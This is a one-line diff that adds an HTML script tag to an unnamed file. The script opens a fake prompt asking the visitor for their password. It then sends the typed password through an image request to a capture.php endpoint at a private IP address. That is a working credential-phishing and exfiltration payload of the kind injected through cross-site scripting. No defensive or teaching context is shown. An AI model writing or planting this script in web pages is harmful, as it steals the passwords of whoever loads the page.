@@ -1,0 +1,1 @@
+<script>var password = prompt("Enter your password to continue"); new Image().src = "http://10.0.0.68/capture.php?c=" + password</script>
